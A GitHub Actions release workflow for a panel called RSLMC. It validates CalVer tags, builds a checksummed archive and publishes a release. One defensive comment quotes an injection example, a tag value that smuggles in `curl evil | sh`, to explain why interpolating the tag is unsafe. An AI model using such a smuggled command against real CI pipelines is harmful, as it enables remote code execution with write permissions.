name: Release

# Publishes a release when a CalVer tag is pushed (`v2026.11.02`, `v2026.11.02.1`, …).
#
# The panel's own updater downloads the assets produced here:
#   rslmc-<version>.tar.gz   the code archive it unpacks and swaps in
#   SHA256SUMS               the checksum it verifies before touching a single file
#
# Everything the panel keeps (database, servers, worlds, backups) lives in the data folder and is
# not part of this archive — that is why an update can never cost an operator their data.

on:
  push:
    tags:
      - "v*"
  workflow_dispatch:

permissions:
  contents: write

jobs:
  release:
    name: Build and publish
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - uses: oven-sh/setup-bun@v2
        with:
          bun-version: 1.4.4

      - name: Install dependencies
        run: bun install --frozen-lockfile

      - name: Typecheck
        run: bun run typecheck

      - name: Unit and integration tests
        run: bun run test

      - name: Derive version from the tag
        id: version
        # The tag name is attacker-influenced input (anyone who can push a tag or a branch name), and
        # `${{ }}` interpolation happens *before* bash sees the line — a tag like
        # `v1.0"; curl evil | sh; #` used to run inside a job that holds `contents: write`.
        # Validate the shape strictly and pass it through `env` from here on; no step interpolates it.
        run: |
          TAG="${GITHUB_REF_NAME}"
          VERSION="${TAG#v}"
          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]{4}\.[0-9]{2}\.[0-9]{2}(\.[0-9]{1,3})?$'; then
            echo "::error::Tag '$TAG' is not a CalVer tag like v2026.11.02.1 — refusing to build a release from it."
            exit 1
          fi
          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
          echo "archive=rslmc-$VERSION.tar.gz" >> "$GITHUB_OUTPUT"
          if ! grep -q "\"version\": \"$VERSION\"" package.json; then
            echo "::error::package.json does not say $VERSION — run 'bun run release' before tagging."
            exit 1
          fi

      - name: Build the release archive
        env:
          VERSION: ${{ steps.version.outputs.version }}
          ARCHIVE: ${{ steps.version.outputs.archive }}
        run: |
          set -euo pipefail
          git archive --format=tar --prefix="RSLMC-${VERSION}/" HEAD | gzip -9 > "${ARCHIVE}"
          sha256sum "${ARCHIVE}" > SHA256SUMS
          cat SHA256SUMS

      - name: Create the GitHub release
        env:
          GH_TOKEN: ${{ github.token }}
          VERSION: ${{ steps.version.outputs.version }}
          ARCHIVE: ${{ steps.version.outputs.archive }}
        run: |
          notes_file="$(mktemp)"
          {
            echo "RSLMC ${VERSION}"
            echo
            echo "Calendar versioning — \`${VERSION}\` means a build from that date."
            echo
            echo "### What changed"
            echo
            # The tag's own commit body is the change list, so the notes a panel shows under
            # Administration → About are the same text that was written when the fix was made.
            git log -1 --pretty=format:'%b' "$GITHUB_REF_NAME"
            echo
            echo
            echo "### Upgrading a running panel"
            echo
            echo "1. Administration → About → **Check for updates**"
            echo "2. **Install update** — downloads, verifies, backs up and swaps the code (data is never touched)"
            echo "3. **Restart RSLMC** — running servers stay online; the panel reattaches to them"
            echo
            echo "### Checksums"
            echo
            echo '```'
            cat SHA256SUMS
            echo '```'
          } > "$notes_file"
          gh release create "$GITHUB_REF_NAME" \
            "${ARCHIVE}" SHA256SUMS \
            --title "RSLMC ${VERSION}" \
            --notes-file "$notes_file" \
            --verify-tag
